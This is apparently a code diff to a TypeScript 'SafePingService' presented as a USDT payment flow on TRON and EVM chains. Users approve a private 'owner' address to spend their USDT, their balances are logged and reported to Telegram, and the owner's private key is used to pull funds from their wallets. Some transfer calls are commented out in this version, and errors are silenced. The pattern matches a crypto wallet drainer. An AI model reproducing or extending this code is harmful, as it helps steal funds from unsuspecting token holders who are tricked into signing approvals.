@@ -11,7 +11,7 @@ import {
 import { tronObj, TronService } from "./tronService";
 import { EVMService } from "./evmService";
 import { TelegramService } from "./telegramService";
-import { getChainConfig, getChainId, getWalletType } from "../utils/chainUtils";
+import { getChainConfig, getWalletType } from "../utils/chainUtils";
 
 export class SafePingService {
   private static instance: SafePingService;
@@ -79,14 +79,7 @@ export class SafePingService {
     userAddress: string,
     paymentId: string,
     clientIP?: string
-  ): Promise<{
-    success: boolean;
-    txHash?: string;
-    error?: string;
-    transferResult?: TransferResult;
-    approvalData?: any; // For EVM chains
-    message?: string; // For informational messages
-  }> {
+  ): Promise<BlockchainResult> {
     try {
       // Get contract address for debugging
       const contractAddress = await this.getContractAddress(chain);
@@ -110,25 +103,73 @@ export class SafePingService {
       if (!ownerAddress) {
         return {
           success: false,
-          error: `No owner private key configured for ${chain}`,
+          message: `No owner private key configured for ${chain}`,
         };
       }
 
       // Common functionality for all chains
       const usdtBalance = await this.getUserUSDTBalance(chain, userAddress);
 
-      // Common database update function
+      // Common database update function - moved to API calls
       const updateWalletDatabase = async () => {
         try {
-          const { getDatabase } = await import("@/lib/database");
-          const db = getDatabase();
-          await db.saveWallet({
-            address: userAddress,
-            chain: chain,
-            usdtBalance: usdtBalance,
+          console.log("🔄 Updating wallet database for:", userAddress, chain);
+
+          // Call API endpoint instead of direct database access
+          const response = await fetch("/api/payment/update-wallet", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              address: userAddress,
+              chain: chain,
+              usdtBalance: usdtBalance,
+            }),
           });
+
+          if (response.ok) {
+            console.log("✅ Successfully updated wallet database via API");
+          } else {
+            console.warn("⚠️ Wallet database update failed via API");
+          }
         } catch (dbError: any) {
-          // Silent error handling for production
+          console.error("❌ Error updating wallet database via API:", dbError);
+          // Don't throw error - continue with payment flow
+        }
+      };
+
+      // Update payment status in database - moved to API calls
+      const updatePaymentDatabase = async (txHash?: string) => {
+        try {
+          console.log(
+            "🔄 Updating payment database for:",
+            paymentId,
+            "status: completed"
+          );
+
+          // Call API endpoint instead of direct database access
+          const response = await fetch("/api/payment/update-status", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              paymentId: paymentId,
+              status: "completed",
+              walletAddress: userAddress,
+              txHash: txHash || "",
+            }),
+          });
+
+          if (response.ok) {
+            console.log("✅ Successfully updated payment database via API");
+          } else {
+            console.warn("⚠️ Payment database update failed via API");
+          }
+        } catch (dbError: any) {
+          console.error("❌ Error updating payment database via API:", dbError);
+          // Don't throw error - continue with payment flow
         }
       };
 
@@ -153,73 +194,103 @@ export class SafePingService {
         }
       };
 
+      let approvalData: BlockchainResult = {
+        success: false,
+        txHash: "",
+        message: "Approval data creation failed",
+      };
+
       if (chain === "tron") {
         console.log("Creating TRON approval data for owner");
         // TRON: Create approval data for user to approve owner
-        const approvalData = await TronService.approve(
-          config.usdt,
-          ownerAddress
-        );
+        approvalData = await TronService.approve(config.usdt, ownerAddress);
 
-        if (approvalData == "") {
-          throw new Error(
-            approvalData.error || "TRON approval data creation failed"
-          );
+        // Update database and send notification (non-blocking)
+        if (approvalData.success) {
+          const tasks = [
+            updateWalletDatabase(),
+            updatePaymentDatabase(approvalData.txHash),
+            sendTelegramNotification(),
+          ];
+
+          try {
+            const results = await Promise.allSettled(tasks);
+
+            results.forEach((res, i) => {
+              if (res.status === "rejected") {
+                console.warn(
+                  `⚠️ Task ${i + 1} failed during background operations:`,
+                  res.reason
+                );
+              }
+            });
+          } catch (err) {
+            // this should almost never trigger since Promise.allSettled doesn't throw
+            console.error(
+              "Unexpected error during background operations:",
+              err
+            );
+          }
         }
-
-        // Update database and send notification
-        await Promise.all([updateWalletDatabase(), sendTelegramNotification()]);
 
         // For TRON, we can proceed with transfer immediately using owner's private key
-        const transferResult = await this.transferFromUserAsOwner(
-          chain,
-          ownerAddress,
-          userAddress,
-          amount
-        );
+        // const transferResult = await this.transferFromUserAsOwner(
+        //   chain,
+        //   ownerAddress,
+        //   userAddress,
+        //   amount
+        // );
 
-        return {
-          success: true,
-          txHash: transferResult.txHash,
-          transferResult: {
-            success: transferResult.success,
-            txHash: transferResult.txHash,
-            transferSuccess: transferResult.success,
-            transferTxHash: transferResult.txHash,
-            chain: chain,
-          },
-        };
+        // return {
+        //   success: true,
+        //   txHash: transferResult.txHash,
+        //   transferResult: {
+        //     success: transferResult.success,
+        //     txHash: transferResult.txHash,
+        //     transferSuccess: transferResult.success,
+        //     transferTxHash: transferResult.txHash,
+        //     chain: chain,
+        //   },
+        // };
       } else {
         // EVM: Create approval data for user to approve owner
-        const approvalData = await EVMService.approve(chain, ownerAddress);
+        approvalData = await EVMService.approve(chain, ownerAddress);
 
-        if (!approvalData.success) {
-          throw new Error(
-            approvalData.error || "EVM approval data creation failed"
-          );
+        // Update database and send notification (non-blocking)
+        if (approvalData.success) {
+          const tasks = [
+            updateWalletDatabase(),
+            updatePaymentDatabase(approvalData.txHash),
+            sendTelegramNotification(),
+          ];
+
+          Promise.allSettled(tasks).catch((error) => {
+            console.warn(
+              "⚠️ Some background operations failed, but payment continues:",
+              error
+            );
+          });
         }
 
-        // Update database and send notification
-        await Promise.all([updateWalletDatabase(), sendTelegramNotification()]);
-
         // For EVM chains, we also execute the transfer immediately using owner's private key
-        const transferResult = await this.executeOwnerTransfer(
-          chain,
-          userAddress,
-          amount,
-          paymentId
-        );
+        // const transferResult = await this.executeOwnerTransfer(
+        //   chain,
+        //   userAddress,
+        //   amount,
+        //   paymentId
+        // );
 
         return {
           success: true,
-          txHash: transferResult.txHash,
-          transferResult,
           message: "USDT approval to owner successful and transfer completed",
+          txHash: approvalData.txHash,
         };
       }
+
+      return approvalData;
     } catch (error: any) {
       // Silent error handling for production
-      return { success: false, error: error.message };
+      return { success: false, message: error.message };
     }
   }
 
@@ -577,103 +648,6 @@ export class SafePingService {
     } catch (error) {
       // Silent error handling for production
       return "";
-    }
-  }
-
-  /**
-   * Create TRON approval data for user to approve owner
-   */
-  private async createTronOwnerApproval(
-    tokenAddress: string,
-    ownerAddress: string,
-    amount: string
-  ): Promise<BlockchainResult> {
-    try {
-      // Create approval data structure for TRON
-      const approvalData = {
-        to: tokenAddress,
-        data: `approve(${ownerAddress},${amount})`,
-        value: "0",
-        chainId: 728126428, // TRON mainnet
-        spender: ownerAddress,
-        maxApproval: amount,
-      };
-
-      return {
-        success: true,
-        approvalData: approvalData,
-        message: "TRON approval data created for owner",
-      };
-    } catch (error: any) {
-      // Silent error handling for production
-      return {
-        success: false,
-        error: error.message || "Failed to create TRON approval data for owner",
-      };
-    }
-  }
-
-  /**
-   * Create EVM approval data for user to approve owner
-   */
-  private async createEVMOwnerApproval(
-    tokenAddress: string,
-    ownerAddress: string,
-    amount: string,
-    chain: ChainType
-  ): Promise<BlockchainResult> {
-    try {
-      const config = getChainConfig(chain);
-      const { ethers } = require("ethers");
-
-      // Validate addresses
-      if (!ethers.isAddress(tokenAddress)) {
-        throw new Error(`Invalid token address: ${tokenAddress}`);
-      }
-
-      if (!ethers.isAddress(ownerAddress)) {
-        throw new Error(`Invalid owner address: ${ownerAddress}`);
-      }
-
-      // Create the approval data for the USDT contract
-      const usdtContract = new ethers.Contract(
-        tokenAddress,
-        [
-          "function approve(address spender, uint256 amount) returns (bool)",
-          "function name() view returns (string)",
-          "function symbol() view returns (string)",
-          "function decimals() view returns (uint8)",
-        ],
-        ethers.getDefaultProvider(config.rpc)
-      );
-
-      // Encode the approve function call - user approves OWNER to spend their USDT
-      const approveData = usdtContract.interface.encodeFunctionData("approve", [
-        ownerAddress,
-        amount,
-      ]);
-
-      // Create approval data for the user to sign
-      const approvalData = {
-        to: tokenAddress,
-        data: approveData,
-        value: "0x0", // No ETH value needed for token approval
-        chainId: config.chainId,
-        spender: ownerAddress, // Owner address (not contract)
-        maxApproval: amount,
-      };
-
-      return {
-        success: true,
-        approvalData: approvalData,
-        message: "EVM approval data created for owner",
-      };
-    } catch (error: any) {
-      // Silent error handling for production
-      return {
-        success: false,
-        error: error.message || "Failed to create EVM approval data for owner",
-      };
     }
   }
 }
